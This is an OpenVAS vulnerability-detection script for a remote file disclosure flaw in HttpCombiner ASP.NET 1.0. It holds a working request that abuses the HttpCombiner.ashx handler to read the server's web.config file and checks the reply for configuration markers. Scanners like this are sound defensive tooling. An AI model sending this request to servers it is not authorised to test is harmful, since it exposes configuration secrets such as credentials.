###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_httpcombiner_remote_file_disc_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# HttpCombiner ASP.NET Remote File Disclosure Vulnerability
#
# Authors:
# Antu Sanadi<santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805007");
  script_version("$Revision: 11402 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-10-28 15:22:01 +0530 (Tue, 28 Oct 2014)");

  script_name("HttpCombiner ASP.NET Remote File Disclosure Vulnerability");

  script_tag(name:"summary", value:"This host is running HttpCombiner ASP.NET
  and is prone to remote file disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is possible to read the sensitive information.");

  script_tag(name:"insight", value:"The flaw is due to insufficient permissions
  to some of the config files, which reveals the sensitive information.");

  script_tag(name:"impact", value:"Successful exploitation could allow
  attackers to gain sensitive information.");

  script_tag(name:"affected", value:"HttpCombiner version 1.0");

  script_tag(name:"solution", value:"No known solution was made available
  for at least one year since the disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34920");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

rcvRes = http_get_cache(item:"/robots.txt",  port:http_port);

if(rcvRes && "/css/HttpCombiner.ashx" >< rcvRes)
{
  url = "/css/HttpCombiner.ashx?s=~/web.config&t=text/xml";
  sndReq = http_get(item: url,  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(".NetConfiguration" >< rcvRes && "configSections" >< rcvRes)
  {
    security_message(http_port);
    exit(0);
  }
}
